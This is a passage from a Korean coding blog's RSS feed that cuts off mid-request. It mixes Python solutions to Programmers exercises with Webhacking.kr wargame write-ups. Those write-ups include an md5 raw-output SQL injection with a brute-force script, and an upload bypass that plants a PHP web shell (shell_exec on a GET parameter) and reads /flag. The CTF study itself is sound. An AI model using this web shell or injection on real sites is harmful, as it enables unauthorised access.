      <pubDate>Sat, 22 May 2021 05:29:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;같은-숫자는-싫어&quot;&gt;&lt;a href=&quot;#같은-숫자는-싫어&quot; class=&quot;headerlink&quot; title=&quot;같은 숫자는 싫어&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="같은-숫자는-싫어"><a href="#같은-숫자는-싫어" class="headerlink" title="같은 숫자는 싫어"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12906">같은 숫자는 싫어</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>배열 arr가 주어집니다. 배열 arr의 각 원소는 숫자 0부터 9까지로 이루어져 있습니다. 이때, 배열 arr에서 연속적으로 나타나는 숫자는 하나만 남기고 전부 제거하려고 합니다. 단, 제거된 후 남은 수들을 반환할 때는 배열 arr의 원소들의 순서를 유지해야 합니다. 예를 들면,</p><ul><li>arr = [1, 1, 3, 3, 0, 1, 1] 이면 [1, 3, 0, 1] 을 return 합니다.</li><li>arr = [4, 4, 4, 3, 3] 이면 [4, 3] 을 return 합니다.<br>배열 arr에서 연속적으로 나타나는 숫자는 제거하고 남은 수들을 return 하는 solution 함수를 완성해 주세요.</li></ul><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><ul><li>배열 arr의 크기 : 1,000,000 이하의 자연수</li><li>배열 arr의 원소의 크기 : 0보다 크거나 같고 9보다 작거나 같은 정수</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr:<span class="built_in">list</span></span>):</span></span><br><span class="line">    result = [arr[<span class="number">0</span>]]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">-1</span>] != i:</span><br><span class="line">            result.append(i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>나는 result 안에 arr의 첫번째 아이템을 넣었다.<br><br>그 후 반복문을 통해 result의 마지막 값과 같지 않으면, result에 값을 넣었다.</p><p>다른 사람의 문제풀이를 보니, 좀 신기한 풀이가 있었다.</p><figure class="highlight python"><figcaption><span>다른 사람의 문제풀이</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no_continuous</span>(<span class="params">s</span>):</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> a[<span class="number">-1</span>:] == [i]: <span class="keyword">continue</span></span><br><span class="line">        a.append(i)</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p>빈 리스트를 a[-1:]를 이용하여 조건문에 활용한 것이다.<br><br>나는 좀 이해가 가지 않았다. 비교가 된다해도, 왜 비교 대상을 리스트로 지정한 걸까?<br><br>그래서 직접 테스트를 하였다.</p><p><img src="/images/pasted-433.png"><br>한번 값을 찍어보니, 정말로 빈 리스트를 활용할 수 있었다.<br><br>또한 출력값이 리스트로 출력되었다. 이 때문에 비교 대상을 리스트로 지정한 것이였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EA%B0%99%EC%9D%80-%EC%88%AB%EC%9E%90%EB%8A%94-%EC%8B%AB%EC%96%B4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 51 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/21/Webhacking-kr/</link>
      <guid>https://lrtk-coder.github.io/2021/05/21/Webhacking-kr/</guid>
      <pubDate>Fri, 21 May 2021 18:55:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-51"><a href="#Old-51" class="headerlink" title="Old - 51"></a>Old - 51</h2><p><img src="/images/pasted-430.png"><br>로그인 페이지가 나왔다. 오른쪽 밑에 코드가 있어서 코드를 살펴봤다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;id&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;pw&#x27;</span>])&#123;</span><br><span class="line">    $db = dbconnect();</span><br><span class="line">    $input_id = addslashes($_POST[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    $input_pw = md5($_POST[<span class="string">&#x27;pw&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    $result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select id from chall51 where id=&#x27;<span class="subst">&#123;$input_id&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$input_pw&#125;</span>&#x27;&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="number">51</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;font color=green&gt;&lt;h1&gt;Wrong&lt;/h1&gt;&lt;/font&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ID는 addslashes 함수로 몇가지 특수 문자가 치환되고, PW는 MD5 해시화가 된다.<br><br>그 후, SQL Query에 들어가게 된다.</p><p>여러 방법을 모색하던 중 MD5를 이용한 SQL Injection을 발견할 수 있었다.</p><p>PHP의 md5 함수 옵션을 보면, True와 False이 있다.<br><br>이것은 binary로 출력할건지를 선택하는 옵션이다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> md5(<span class="string">&quot;hi&quot;</span>, <span class="literal">True</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-431.png"><br>즉, 저렇게 알 수 없는 값이 출력이 된다.</p><p>이것을 이용하여, 논리적 에러를 이용한 SQL Injection을 시도할 수 있다.</p><p>해쉬 값이 <code>dasdsada&#39;=&#39;ewqrfqw</code>으로 생성이 되어 PW에 들어가게 된다면, <code>pw=&#39;dasdsada&#39;=&#39;ewqrfqw&#39;</code>으로 삽입이 된다.<br><br>그럼 <code>pw=&#39;dasdsada&#39;</code>는 False를 갖게 된다. 이를 보면, <code>False=&#39;ewqrfqw&#39;</code>로 되는데, False와 같은 값이 아니기 때문에 뒤의 값도 False를 갖게 된다.<br><br>즉, <code>False=False</code>가 되기 때문에 결과적으로 <code>True</code>가 된다.</p><p>위와 같은 방식으로 진행한다면, admin으로 로그인이 가능할 것이다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">1</span>; $i&lt;<span class="number">1000000000000</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(md5($i, <span class="literal">True</span>), <span class="string">&quot;&#x27;=&#x27;&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;PW is <span class="subst">&#123;$i&#125;</span>\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hash is &quot;</span>.md5($i, <span class="literal">True</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PW is 1839431</span><br><span class="line">Hash is �7���ıA@J�<span class="string">&#x27;=&#x27;</span>��</span><br></pre></td></tr></table></figure><p><code>&#39;=&#39;</code>이 포함된 해쉬값을 구하는 코드로  SQL Injection에 사용될 PW값을 구할 수 있었다.</p><p><img src="/images/pasted-432.png"><br>해당 값을 넣어주니, Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/21/Webhacking-kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 소수 찾기</title>
      <link>https://lrtk-coder.github.io/2021/05/21/Programmers-Level-1-%EC%86%8C%EC%88%98-%EC%B0%BE%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/21/Programmers-Level-1-%EC%86%8C%EC%88%98-%EC%B0%BE%EA%B8%B0/</guid>
      <pubDate>Fri, 21 May 2021 06:35:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;소수-찾기&quot;&gt;&lt;a href=&quot;#소수-찾기&quot; class=&quot;headerlink&quot; title=&quot;소수 찾기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12921&quot;&gt;소수 찾</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="소수-찾기"><a href="#소수-찾기" class="headerlink" title="소수 찾기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12921">소수 찾기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>1부터 입력받은 숫자 n 사이에 있는 소수의 개수를 반환하는 함수, solution을 만들어 보세요.</p><p>소수는 1과 자기 자신으로만 나누어지는 수를 의미합니다.<br><br>(1은 소수가 아닙니다.)</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>n은 2이상 1000000이하의 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="실패"><a href="#실패" class="headerlink" title="실패"></a>실패</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num:<span class="built_in">int</span></span>):</span>    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n+<span class="number">1</span>):</span><br><span class="line">        result += isPrime(i)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>많은 시간을 소비하여 효율성 조건을 만족하지 못하였다.<br><br>백준에서 풀어 본 경험으로 나는 루트를 씌어서 반복 횟수를 줄이는 방법으로 시도하였다.<br><br><br><br></p><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line">    m = <span class="built_in">int</span>(num ** <span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, m+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n+<span class="number">1</span>):</span><br><span class="line">        result += isPrime(i)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>루트를 씌어서 반복 횟수를 줄였다.<br><br><br><br></p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeList</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    sieve = [<span class="literal">True</span>] * (n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">int</span>(n ** <span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+i, n+<span class="number">1</span>, i):</span><br><span class="line">                sieve[j] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sieve</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    prime = primeList(n)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(prime[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>에라토스테네스의 체를 이용하여 풀이한 코드이다.<br></p><blockquote><p><a href="https://ko.wikipedia.org/wiki/%EC%97%90%EB%9D%BC%ED%86%A0%EC%8A%A4%ED%85%8C%EB%84%A4%EC%8A%A4%EC%9D%98_%EC%B2%B4">에라토스테네스의 체</a><br><br>에라토스테네스의 체가 궁금하다면 이곳을 참고하면 된다.</p></blockquote><br><h4 id="방법3"><a href="#방법3" class="headerlink" title="방법3"></a>방법3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n</span>):</span></span><br><span class="line">    m = <span class="built_in">int</span>(n ** <span class="number">0.5</span>)</span><br><span class="line">    num = <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,m+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> num:</span><br><span class="line">            num -= <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">2</span>*i,n+<span class="number">1</span>,i))</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(num)</span><br></pre></td></tr></table></figure><p>에라토스테네스의 체를 파이썬스럽게 변경한 코드이다.<br><br>Set을 이용하여 더욱 간소화 시켰다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/21/Programmers-Level-1-%EC%86%8C%EC%88%98-%EC%B0%BE%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 43 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Write-Up/</guid>
      <pubDate>Thu, 20 May 2021 19:48:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-43"><a href="#Old-43" class="headerlink" title="Old - 43"></a>Old - 43</h2><p><img src="/images/pasted-425.png" alt="upload successful"><br>이번 문제는 웹쉘을 업로드하여, 웹쉘로 flag 파일을 읽는 문제이다.</p><p>나는 명령어를 실행시킬 수 있는 코드를 가진 PHP를 업로드를 해봤다.</p><ul><li>test.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> shell_exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>업로드 결과<br><img src="/images/pasted-426.png" alt="upload successful"><br>잘못된 타입이라면서 업로드가 거절되었다.</li></ul><p>타입은 Content-Type를 지칭하는 것으로 판단된다.<br><br>나는 어떤 파일이 업로드가 가능한지 확인하기 위해 이미지 파일을 업로드해봤다.</p><p><img src="/images/pasted-427.png" alt="upload successful"><br>업로드가 성공되는 것을 확인을 하여, 나는 해당 이미지의 Content-Type를 확인해봤다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file&quot;; filename=&quot;IMG_4926.jpg&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br></pre></td></tr></table></figure><p>이제 저 타입으로 test.php의 타입에 수정하여 보내봤다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryaBqyI9UjZ9h6RG5N</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundaryaBqyI9UjZ9h6RG5N--</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-428.png" alt="upload successful"><br>업로드가 성공하였다.<br><br>나는 서버에 test.php를 요청하여 flag를 출력해봤다.</p><p><img src="/images/pasted-429.png" alt="http://webhacking.kr:10004/upload/test.php?cmd=cat%20/flag"><br>Flag를 얻을 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 41 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Old-41-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Old-41-Write-Up/</guid>
      <pubDate>Thu, 20 May 2021 19:43:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-41"><a href="#Old-41" class="headerlink" title="Old - 41"></a>Old - 41</h2><p><img src="/images/pasted-418.png"><br>파일을 업로드하는 페이지가 나왔다.</p><p>코드를 살펴봤다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> “../../config.php”;</span><br><span class="line">  <span class="keyword">include</span> “./inc.php”;</span><br><span class="line">  <span class="keyword">if</span>($_GET[‘view_source’]) view_source();</span><br><span class="line">  error_reporting(E_ALL);</span><br><span class="line">  ini_set(“display_errors”, <span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span>&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Challenge <span class="number">41</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[‘up’]) &amp;&amp; $_FILES[‘up’])&#123;</span><br><span class="line">    $fn = $_FILES[‘up’][‘name’];</span><br><span class="line">    $fn = str_replace(“.”,””,$fn);</span><br><span class="line">    $fn = str_replace(“&lt;“,””,$fn);</span><br><span class="line">    $fn = str_replace(“&gt;”,””,$fn);</span><br><span class="line">    $fn = str_replace(“/“,””,$fn);</span><br><span class="line"></span><br><span class="line">    $cp = $_FILES[‘up’][‘tmp_name’];</span><br><span class="line">    copy($cp,”./&#123;$upload_dir&#125;/&#123;$fn&#125;”);</span><br><span class="line">    $f = @fopen(“./&#123;$upload_dir&#125;/&#123;$fn&#125;”,”w”);</span><br><span class="line">    @fwrite($f,$flag);</span><br><span class="line">    @fclose($f);</span><br><span class="line">    <span class="keyword">echo</span>(“Done~”);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 보니, <code>&lt;, &gt;, ?, ., /</code>을 치환되어서 파일 이름에 스크립트는 불가능해 보인다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f = @fopen(“./&#123;$upload_dir&#125;/&#123;$fn&#125;”,”w”);</span><br><span class="line">@fwrite($f,$flag);</span><br></pre></td></tr></table></figure><p>이 코드를 보니, 파일을 읽으면 Flag를 주는 것으로 판단된다.</p><p>그래서 업로드 폴더를 알아내기 위해 몇가지 실험을 해봤다.<br><img src="/images/pasted-419.png"><br>그 중 하나가 파일을 선택하지 않고, 업로드를 시도하니 오류를 출력되는 것을 알 수 있었다.</p><p>에러 메시지를 확인하니, cp 명령어에서 일어나는 오류가 출력되는 것으로 보인다.<br><br>이를 이용하여 파일을 업로드하여, cp 명령어를 에러를 발생하도록 하겠다.</p><p>현재 내가 오류를 줄 수 있는 방법은 파일명과 파일의 내용으로 두가지 선택 상항이 있다.</p><p>나는 일단 파일명으로 에러를 발생시키려고 한다.<br><br>인터넷에 파일명의 길이를 검색해봤다.<br><img src="/images/pasted-420.png"><br>파일명은 255bytes 크기로 제한된다는 것을 알 수 있었다.</p><p>개인적으로 궁금하여 한번 시도해봤다.</p><p><img src="/images/pasted-421.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryamSoOBSPCV58OK7l</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;up&quot;; 